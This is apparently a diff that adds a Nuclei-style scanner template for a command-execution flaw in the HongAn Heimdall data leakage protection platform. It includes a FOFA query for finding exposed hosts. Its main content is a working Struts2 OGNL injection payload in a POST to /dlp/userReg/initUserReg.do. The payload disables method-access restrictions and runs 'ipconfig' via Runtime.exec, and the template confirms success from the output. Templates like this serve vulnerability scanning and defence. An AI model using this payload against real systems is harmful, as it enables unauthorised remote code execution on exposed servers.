@@ -1,0 +1,33 @@
+id: hongan-heimdall-dlp-inituserreg-rce
+
+info:
+  name: 虹安信息数据泄露防护平台initUserReg 命令执行
+  author: onewin
+  severity: high
+  description: 虹安信息数据泄露防护平台initUserReg 命令执行
+  metadata:
+    fofa-query: product="HongAn-Heimdall-DLP" || body="userReg/initUserReg.do"
+  tags: HONGAN-HEIMDALL-DLP Data Leakage Protection System
+
+http:
+  - raw:
+      - |-
+        @timeout: 30s
+        POST /dlp/userReg/initUserReg.do HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 667
+
+        ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ipconfig\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Windows IP"
+        part: body
